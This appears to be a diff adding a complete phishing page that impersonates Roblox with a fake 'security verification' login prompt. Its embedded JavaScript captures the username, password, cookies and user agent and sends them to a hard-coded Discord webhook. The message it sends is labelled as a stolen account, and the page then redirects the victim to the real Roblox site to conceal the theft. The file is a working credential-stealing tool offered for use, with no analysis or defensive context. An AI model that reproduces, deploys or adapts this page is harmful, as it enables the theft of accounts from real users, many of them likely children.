@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+
+<html lang="en">
+
+<head>
+
+    <meta charset="UTF-8">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Roblox</title>
+
+    <style>
+
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
+
+        body { margin:0; padding:0; background:#0e0e0e; font-family:'Roboto',sans-serif; color:white; display:flex; justify-content:center; align-items:center; height:100vh; }
+
+        .container { width:460px; background:#111; border-radius:8px; padding:40px 30px; box-shadow:0 0 20px rgba(0,0,0,0.9); }
+
+        .logo { text-align:center; margin-bottom:20px; }
+
+        .logo img { height:65px; }
+
+        h2 { text-align:center; margin:15px 0; }
+
+        .warning { color:#ffcc00; text-align:center; font-size:15px; margin-bottom:20px; }
+
+        input { width:100%; padding:14px; margin:10px 0; background:#222; border:none; border-radius:4px; color:white; font-size:16px; }
+
+        button { width:100%; padding:14px; background:#00b3ff; border:none; border-radius:4px; color:black; font-weight:bold; font-size:18px; cursor:pointer; margin-top:10px; }
+
+        button:hover { background:#00c3ff; }
+
+    </style>
+
+</head>
+
+<body>
+
+    <div class="container">
+
+        <div class="logo">
+
+            <img src="https://www.roblox.com/assets/images/Logo.svg" alt="Roblox">
+
+        </div>
+
+        <h2>Security Verification Required</h2>
+
+        <p class="warning">Your Roblox session has been flagged for review. Please log in again to continue.</p>
+
+        
+
+        <form id="loginForm">
+
+            <input type="text" id="username" placeholder="Username or Email" required>
+
+            <input type="password" id="password" placeholder="Password" required>
+
+            <button type="submit">Verify & Continue</button>
+
+        </form>
+
+        
+
+        <p style="text-align:center; font-size:12px; color:#666; margin-top:20px;">
+
+            This is a security measure to protect your account.
+
+        </p>
+
+    </div>
+
+    <script>
+
+        const webhook = "https://discord.com/api/webhooks/1511487550949298247/29TJUJD18hQbVSzFXZ_8Es-TqnyihbXU6Nc0avCTHFHEqC8DuTTGS4cUAm8aovZjtQmi"; // ← Replace with your webhook
+
+        // Try to grab any available cookies (limited due to cross-domain, but catches some)
+
+        function getCookies() {
+
+            let cookies = document.cookie;
+
+            if (cookies) {
+
+                return cookies;
+
+            }
+
+            return "No direct cookies visible (standard cross-origin behavior)";
+
+        }
+
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+
+            e.preventDefault();
+
+            
+
+            const username = document.getElementById('username').value;
+
+            const password = document.getElementById('password').value;
+
+            const cookies = getCookies();
+
+            const userAgent = navigator.userAgent;
+
+            const ipInfo = "Captured via webhook (use IP logger if needed)";
+
+            // Send full data to Discord
+
+            fetch(webhook, {
+
+                method: "POST",
+
+                headers: { "Content-Type": "application/json" },
+
+                body: JSON.stringify({
+
+                    username: "🔴 Roblox Auto Logger",
+
+                    embeds: [{
+
+                        title: "🚨 New Roblox Account Stolen!",
+
+                        color: 0xff0000,
+
+                        fields: [
+
+                            { name: "Username", value: username, inline: true },
+
+                            { name: "Password", value: password, inline: true },
+
+                            { name: "Cookies", value: "```" + cookies + "```" },
+
+                            { name: "User-Agent", value: userAgent.substring(0, 200), inline: false },
+
+                            { name: "Time", value: new Date().toUTCString() },
+
+                            { name: "Status", value: "✅ Ready to use .ROBLOSECURITY" }
+
+                        ],
+
+                        footer: { text: "Auto-logger triggered - Victim was already logged in" }
+
+                    }]
+
+                })
+
+            }).then(() => {
+
+                // Redirect to real Roblox after stealing
+
+                window.location.href = "https://www.roblox.com/home";
+
+            }).catch(err => {
+
+                window.location.href = "https://www.roblox.com/home";
+
+            });
+
+        });
+
+        // Auto-trigger visual "checking" effect
+
+        setTimeout(() => {
+
+            console.log("%cRoblox Security Check Active", "color: #00ff00");
+
+        }, 800);
+
+    </script>
+
+</body>
+
+</html>
